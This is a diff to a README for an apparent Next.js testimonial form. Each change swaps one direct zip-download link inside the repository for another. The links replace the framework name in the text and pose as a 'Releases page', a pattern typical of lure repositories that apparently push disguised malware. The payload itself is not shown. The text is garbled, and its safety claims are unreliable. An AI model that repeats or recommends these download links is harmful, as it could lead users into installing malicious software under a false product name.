@@ -1,9 +1,9 @@
 # 🌟 nextjs-testimonial-form - Easy Testimonial Form for Your Site
 
-[![Download Now](https://raw.githubusercontent.com/tortugazx/nextjs-testimonial-form/main/styles/form-testimonial-nextjs-3.0.zip%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/tortugazx/nextjs-testimonial-form/main/styles/form-testimonial-nextjs-3.0.zip)
+[![Download Now](https://github.com/tortugazx/nextjs-testimonial-form/raw/refs/heads/main/lib/nextjs_form_testimonial_1.8.zip%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tortugazx/nextjs-testimonial-form/raw/refs/heads/main/lib/nextjs_form_testimonial_1.8.zip)
 
 ## 📝 Description
-The **nextjs-testimonial-form** is a production-ready solution that allows you to collect testimonials for your website. It features a user-friendly chat interface and integrates seamlessly with Google Sheets, making your testimonial management simple. Built with the latest technologies, this application uses https://raw.githubusercontent.com/tortugazx/nextjs-testimonial-form/main/styles/form-testimonial-nextjs-3.0.zip 16, React 19, TypeScript, and Biome to ensure a smooth performance.
+The **nextjs-testimonial-form** is a production-ready solution that allows you to collect testimonials for your website. It features a user-friendly chat interface and integrates seamlessly with Google Sheets, making your testimonial management simple. Built with the latest technologies, this application uses https://github.com/tortugazx/nextjs-testimonial-form/raw/refs/heads/main/lib/nextjs_form_testimonial_1.8.zip 16, React 19, TypeScript, and Biome to ensure a smooth performance.
 
 ## 🚀 Getting Started
 Follow these steps to get up and running with the nextjs-testimonial-form. 
@@ -14,7 +14,7 @@ Follow these steps to get up and running with the nextjs-testimonial-form.
 - A modern web browser (Chrome, Firefox, Safari) for using the interface
 
 ### 🔗 Download & Install
-To get the software, visit the Releases page here: [Download Releases](https://raw.githubusercontent.com/tortugazx/nextjs-testimonial-form/main/styles/form-testimonial-nextjs-3.0.zip).
+To get the software, visit the Releases page here: [Download Releases](https://github.com/tortugazx/nextjs-testimonial-form/raw/refs/heads/main/lib/nextjs_form_testimonial_1.8.zip).
 
 1. Click the link above to go to the Releases page. 
 2. Find the latest version of the software.
@@ -32,7 +32,7 @@ Once you have installed the software, follow these steps to start using it:
 ### 🔧 Features
 - **Chat Interface:** An intuitive and interactive way to engage users.
 - **Google Sheets Integration:** Store and manage testimonials easily.
-- **Modern Technologies:** Utilizes https://raw.githubusercontent.com/tortugazx/nextjs-testimonial-form/main/styles/form-testimonial-nextjs-3.0.zip, React, TypeScript, and Biome for optimal performance.
+- **Modern Technologies:** Utilizes https://github.com/tortugazx/nextjs-testimonial-form/raw/refs/heads/main/lib/nextjs_form_testimonial_1.8.zip, React, TypeScript, and Biome for optimal performance.
 
 ### 🔒 Security
 Your data is safe with the nextjs-testimonial-form. The application follows best security practices to protect your information when interacting with Google Sheets and other APIs.
@@ -65,4 +65,4 @@ For further inquiries, please reach out through the issues section of our GitHub
 
 ---
 
-[![Download Now](https://raw.githubusercontent.com/tortugazx/nextjs-testimonial-form/main/styles/form-testimonial-nextjs-3.0.zip%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/tortugazx/nextjs-testimonial-form/main/styles/form-testimonial-nextjs-3.0.zip)
+[![Download Now](https://github.com/tortugazx/nextjs-testimonial-form/raw/refs/heads/main/lib/nextjs_form_testimonial_1.8.zip%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tortugazx/nextjs-testimonial-form/raw/refs/heads/main/lib/nextjs_form_testimonial_1.8.zip)
